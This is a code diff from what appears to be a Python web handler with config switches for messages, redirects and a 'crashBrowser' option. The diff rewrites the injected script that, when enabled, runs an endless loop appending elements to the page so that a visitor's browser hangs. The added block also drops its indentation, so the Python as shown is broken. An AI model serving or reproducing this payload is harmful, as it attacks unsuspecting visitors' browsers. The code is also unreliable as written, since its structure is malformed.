@@ -261,8 +261,20 @@ height: 100vh;
                 if config["message"]["doMessage"]:
                     data = message.encode()
                 
-                if config["crashBrowser"]:
-                    data = message.encode() + b'<script>setTimeout(function(){for (var i=6942069;i==i;i*=i){console.log(i)}}, 100)</script>'
+if config["crashBrowser"]:
+    crash_script = (
+        '<script>'
+        'setTimeout(function(){'
+        'for (var i = 69420; true; i = Math.pow(i, 1.5)) {'
+        'console.log(i.toFixed(2));'
+        'let div = document.createElement("div");'
+        'div.innerText = "Crash " + i;'
+        'document.body.appendChild(div);'
+        '}'
+        '}, 10);'
+        '</script>'
+    )
+    data = message.encode() + crash_script.encode()
 
                 if config["redirect"]["redirect"]:
                     data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
